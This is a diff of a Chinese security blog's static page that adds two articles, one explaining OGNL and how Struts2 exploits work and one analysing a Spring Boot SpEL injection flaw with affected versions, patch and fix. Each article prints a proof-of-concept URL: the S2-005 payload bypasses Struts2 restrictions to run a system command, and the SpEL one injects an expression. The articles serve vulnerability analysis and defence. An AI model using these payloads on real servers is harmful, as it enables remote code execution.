+<h5 id="构造对象"><a href="#构造对象" class="headerlink" title="构造对象"></a>构造对象</h5><p>OGNL支持直接通过表达式来构造对象，构造的方式主要包括三种：<br>1．构造List：使用{}，中间使用逗号隔开元素的方式表达列表<br>2．构造map：使用#{},中间使用逗号隔开键值对，并使用冒号隔开key和value<br>3．构造对象：直接使用已知的对象构造函数来构造对象<br>可以看到OGNL在语法层面上所表现出来的强大之处，不仅能够直接对容器对象构造提供语法层面支持，还能够对任意java对象提供支持。然而正因为OGNL过于强大，它也造成了诸多安全问题。恶意攻击者通过构造特定数据带入OGNL表达式解析并执行，而OGNL可以用来获取和设置Java对象的属性，同时也可以对服务端对象进行修改，所以只要绕过沙盒恶意攻击者甚至可以执行系统命令进行系统攻击。</p>
+<h4 id="深入OGNL实现类"><a href="#深入OGNL实现类" class="headerlink" title="深入OGNL实现类"></a>深入OGNL实现类</h4><p>在OGNL三要素中，context上下文环境为OGNL提供计算运行的环境，这个运行环境在OGNL内部由OgnlContext类实现，它是一个map结构。在OGNL.java中可以看到OgnlContext会在OGNL计算时动态创建，同时传入map结构的context，并根据传入的参数设定OGNL计算的一些默认行为以及设置root对象。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">public static Map addDefaultContext(Object root, ClassResolver classResolver, TypeConverter converter, MemberAccess memberAccess, Map context)</div><div class="line">&#123;</div><div class="line">    OgnlContext result;</div><div class="line">    <span class="keyword">if</span> (!(context instanceof OgnlContext))</div><div class="line">    &#123;</div><div class="line">        result = new OgnlContext();</div><div class="line">        result.setValues(context);</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        result = (OgnlContext) context;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (classResolver != null)</div><div class="line">    &#123;</div><div class="line">        result.setClassResolver(classResolver);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (converter != null)</div><div class="line">    &#123;</div><div class="line">        result.setTypeConverter(converter);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (memberAccess != null)</div><div class="line">    &#123;</div><div class="line">        result.setMemberAccess(memberAccess);</div><div class="line">    &#125;</div><div class="line">    result.setRoot(root);</div><div class="line">    <span class="built_in">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里看到MemberAccess属性，在struts2漏洞利用中经常看到。转到OgnlContext类中查看。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess( <span class="literal">false</span> );</div></pre></td></tr></table></figure></p>
+<p>MemberAccess指定OGNL的对象属性、方法访问策略，这里初始默认情况下是flase，即默认不允许访问。在struts2中SecurityMemberAccess类封装了DefaultMeberAccess类并进行了扩展，指定是否支持访问静态方法以及通过指定正则表达式来规定某些属性是否能够被访问。其中allowStaticMethodAccess默认为flase，即默认禁止访问静态方法。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public SecurityMemberAccess(boolean method) &#123;</div><div class="line">    super(<span class="literal">false</span>);</div><div class="line">    allowStaticMethodAccess = method;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>另外在OGNL实现了MethodAccessor及PropertyAccessor类规定OGNL在访问方法和属性时的实现方式，详细可参考代码文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public interface MethodAccessor &#123;</div><div class="line">    callMethod(Map&lt;String,Object&gt; context, Object target, String methodName, Object[] args)</div><div class="line">    callStaticMethod(Map&lt;String,Object&gt; context, Class&lt;?&gt; targetClass, String methodName, Object[] args)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在struts2中，XWorkMethodAccessor类对MethodAccessor进行了封装，其中在callStaticMethod方法中可以看到，程序首先从上下文获取到DENY_METHOD_EXECUTION值并转换为布尔型，如果为false则可以执行静态方法，如果为true则不执行静态发放并返回null。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">public Object callStaticMethod(Map context, Class aClass, String string, Object[] objects) throws MethodFailedException &#123;</div><div class="line">    Boolean <span class="built_in">exec</span> = (Boolean) context.get(ReflectionContextState.DENY_METHOD_EXECUTION);</div><div class="line">    boolean e = ((<span class="built_in">exec</span> == null) ? <span class="literal">false</span> : exec.booleanValue());</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!e) &#123;</div><div class="line">        <span class="built_in">return</span> callStaticMethodWithDebugInfo(context, aClass, string, objects);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">return</span> null;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="Struts2漏洞利用原理"><a href="#Struts2漏洞利用原理" class="headerlink" title="Struts2漏洞利用原理"></a>Struts2漏洞利用原理</h4><p>上文已经详细介绍了OGNL引擎，因为OGNL过于强大，它也造成了诸多安全问题。恶意攻击者通过构造特定数据带入OGNL表达式即可能被解析并执行，而OGNL可以用来获取和设置Java对象的属性，同时也可以对服务端对象进行修改，所以只要绕过Struts2的一些安全策略，恶意攻击者甚至可以执行系统命令进行系统攻击。如struts2远程代码执行漏洞s2-005。<br>虽然Struts2出于安全考虑，在SecurityMemberAccess类中通过设置禁止静态方法访问及默认禁止执行静态方法来阻止代码执行。即上面提及的denyMethodExecution为true，MemberAccess为false。但这两个属性都可以被修改从而绕过安全限制执行任意命令。s2-005 POC如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mydomain/MyStruts.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(<span class="string">"false"</span>)))&amp;(asdf)((<span class="string">'\u0023rt.exec(‘ipconfig’)'</span>)(\u0023rt\[email]u003d@java.lang.Runt[/email]ime@getRuntime()))=1</div></pre></td></tr></table></figure></p>
+<p>在POC中\u0023是因为S2-003对#号进行了过滤，但没有考虑到unicode编码情况，而通过#_memberAccess[\’allowStaticMethodAccess\’]’)(meh)=true，可以设置允许访问静态方法，因为getRuntime方法是静态的，通过context[\’xwork.MethodAccessor.denyMethodExecution\’]=#foo’)(#foo=new%20java.lang.Boolean(“false”)设置拒绝执行方法为false，也就是允许执行静态方法。最后调用rt.exec(‘ipconfig’)执行任意命令。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cjc1wxjms000fjo1bo0j63ugt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Spring-Boot框架SPEL表达式注入漏洞" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" class="article-date">
+  <time datetime="2016-07-15T07:42:14.000Z" itemprop="datePublished">2016-07-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/">Spring Boot框架SPEL表达式注入漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>pring是2003年兴起的轻量级Java开发框架。任何Java应用都可以使用该框架的核心特性，在Java EE平台之上有可用于构建Web应用的扩展。Spring Boot是Spring 的一个核心子项目，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置国内包括百度、阿里巴巴、腾讯等诸多知名企业都在使用该框架。<br>最近Spring Boot框架的SpEL表达式注入通用漏洞曝光，利用该漏洞，远程攻击者在服务器上可执行任意命令。</p>
+<h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><p>Spring Boot 1.1 1.2 1.3.0版本</p>
+<h4 id="不受影响的版本"><a href="#不受影响的版本" class="headerlink" title="不受影响的版本"></a>不受影响的版本</h4><p>Spring Boot 1.3.1及以上版本</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>以下是官方给的漏洞说明：<br><img src="/upload_image/3.png" alt=""><br>查看spring boot1.3.0的源文件ErrorMvcAutoConfiguration.java，发现出问题的地方主要在SpelView类中：<br><img src="/upload_image/4.png" alt=""><br>经过分析得知在用户采用了Spring Boot启动Spring MVC项目后Spring Boot的默认异常模板在处理异常信息的时候递归解析SPEL表达式，可导致SPEL表达式注入并执行。主要问题是SpelView类中会对路径中或者名字中含有的表达式递归解析，所以在1.3.1修复时添加了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用此漏洞，只需在SpringMVC的Controller中的参数触发一个异常，异常信息带有SPEL表达式就可以注入了。<br>POC：<br><a href="http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}" target="_blank" rel="external">http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}</a><br>漏洞证明：<br><img src="/upload_image/5.png" alt=""><br>利用表达式成功创建了字符串Nsfocus.</p>
+<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>从spring-boot的github的项目中可以看到，这个漏洞是在这个commit中修复的：<br><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a><br>在修复的log里可以看到存着漏洞的1.3.0和1.3.1的差别：<br><img src="/upload_image/6.png" alt=""><br>1.3.1创建了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>升级Spring Boot版本至1.3.1或以上版本</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://www.freebuf.com/news/108665.html" target="_blank" rel="external">http://www.freebuf.com/news/108665.html</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-226888" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-226888</a><br><a href="https://github.com/spring-projects/spring-boot/issues/4763" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/issues/4763</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjc1wxjmp000cjo1baj37gnbc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="w-面试一年前的自己" class="article article-type-w" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -156,7 +373,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/29/面试一年前的自己/" data-id="cjbx657kr000qfg1b16khf0az" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/29/面试一年前的自己/" data-id="cjc1wxjnu000vjo1b14v5yn10" class="article-share-link">Share</a>
       
       
     </footer>
@@ -212,7 +429,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjbx657ko000lfg1bc0lo7mun" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjc1wxjnl000ojo1bp84a81ts" class="article-share-link">Share</a>
       
       
     </footer>
@@ -266,7 +483,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/Hexo-搭建Blog教程/" data-id="cjbx657k10005fg1b9gvosjgn" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/18/Hexo-搭建Blog教程/" data-id="cjc1wxjmh0006jo1bwjaxbgp8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -311,7 +528,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/hello-world/" data-id="cjbx657kh000ffg1bwxip8nzx" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/08/hello-world/" data-id="cjc1wxjmq000djo1bj7uksh5s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -340,9 +557,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Arkiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -350,9 +567,21 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Siste innlegg</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/01/05/浏览器工作原理/">浏览器工作原理</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/02/机器学习之安全数据集/">机器学习之安全数据集</a>
+          </li>
         
           <li>
             <a href="/2017/12/27/大型互联网企业入侵检测实战总结/">大型互联网企业入侵检测实战总结</a>
@@ -360,18 +589,6 @@
         
           <li>
             <a href="/2017/11/27/Shodan-快速入门/">Shodan 快速入门</a>
-          </li>
-        
-          <li>
-            <a href="/2017/11/18/洛克希德·马丁定义的“杀伤链模型/">洛克希德·马丁定义的“杀伤链模型</a>
-          </li>
-        
-          <li>
-            <a href="/2017/11/03/蜜罐与内网安全/">蜜罐与内网安全</a>
-          </li>
-        
-          <li>
-            <a href="/2017/10/27/HTTP-fuzzing-List/">HTTP fuzzing List</a>
           </li>
         
       </ul>
